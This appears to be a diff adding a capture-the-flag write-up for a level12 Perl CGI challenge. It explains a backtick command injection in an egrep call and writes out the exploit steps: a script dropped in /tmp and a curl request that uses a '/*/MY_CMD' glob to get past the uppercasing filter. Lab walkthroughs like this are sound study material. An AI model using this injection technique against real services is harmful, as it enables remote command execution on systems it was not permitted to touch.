@@ -1,0 +1,32 @@
+We have a level12.pl, so let's cat it to understand what it does.
+
+$xx =~ tr/a-z/A-Z/; -> this line turns char into uppercase
+
+$xx =~ s/\s.*//; -> this line is deleting spaces
+
+output = `egrep "^$xx" /tmp/xd 2>&1`;
+
+this line is using `` wich will be the base of our exploit.
+
+
+we can't just do `getflag > /tmp/file` because of the upercase line.
+
+So we'll create a file in uppercase in tmp wich will contain the getflag command and a file to carry the result of it.
+
+echo "getflag > /tmp/result" > /tmp/MY_CMD
+
+we give all permitions to it by doing:
+
+chmod 777 /tmp/MY_CMD
+
+
+
+Now we can't just curl localhost:4646?x='`/tmp/MY_CMD`' 
+
+So instead we'll use the '*' from the shell to find our tmp/MY_CMD and use `` so it's considered as a command: 
+
+curl localhost:4646?x='`/*/MY_CMD`'
+
+now that the cmd was executed, we just have to cat the result in /tmp
+
+cat /tmp/result
